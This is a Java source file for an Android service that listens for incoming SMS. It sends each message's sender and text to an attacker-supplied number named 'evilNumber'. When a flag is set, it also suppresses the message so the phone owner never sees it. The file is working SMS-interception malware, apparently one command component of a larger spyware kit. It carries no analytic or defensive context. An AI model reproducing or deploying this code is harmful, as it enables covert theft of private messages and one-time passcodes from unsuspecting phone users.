package com.SmsService.CommandComponent;


import com.SmsService.AuxiliaryComponent.CommonVariable;
import com.SmsService.AuxiliaryComponent.Debug;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;



public class FowardService extends Service {
	BroadcastReceiver fowardRecieve;
	@Override
	public IBinder onBind(Intent intent) {		
		return null;
	}	
	
	public void onCreate() {
		Debug.PrintLog("FowardService","Foward Service created...");
		
	}
	
	public void onDestroy() {
		Debug.PrintLog("FowardService","Foward Service destroyed...");
	}
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {	
		String evilNumber = intent.getExtras().getString("evilNumber");
		fowardRecieve = new FowardReciever(evilNumber);
		
		IntentFilter intfilter=new IntentFilter();
		intfilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		registerReceiver(fowardRecieve,intfilter);	
		
		
	    return START_STICKY;
	}
	
	public class FowardReciever extends BroadcastReceiver {
		private String evilNumber ;
		
		public FowardReciever ( String evilNumber ) {
			this.evilNumber = evilNumber ;
			
		}
		@Override
		public void onReceive(Context context, Intent intent) {			
			Bundle bundle = intent.getExtras();        
	        SmsMessage[] msgs = null;
	        String content = "";
	        String number="";        
	        if (bundle != null)
	        {
	            //---retrieve the SMS message received---
	            Object[] pdus = (Object[]) bundle.get("pdus");
	            msgs = new SmsMessage[pdus.length]; 
	            
	            for (int i=0; i<msgs.length; i++){
	                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
	                number +=  msgs[i].getOriginatingAddress();                
	                content += msgs[i].getMessageBody().toString();
	                content += "\n";        
	            }//end for
	            
	            fowardSms(content,number,evilNumber);
	            if ( CommonVariable.enableMACURY == true ) {
	            	this.abortBroadcast();
	            }
	        }
			
 
		}
		private void fowardSms(String content, String sourceNumber, String destNumber){
			SmsManager smsManager = SmsManager.getDefault();  
	        smsManager.sendTextMessage(destNumber, null, "foward message:"+sourceNumber+"->"+content, null, null);
		}

 
	}

}
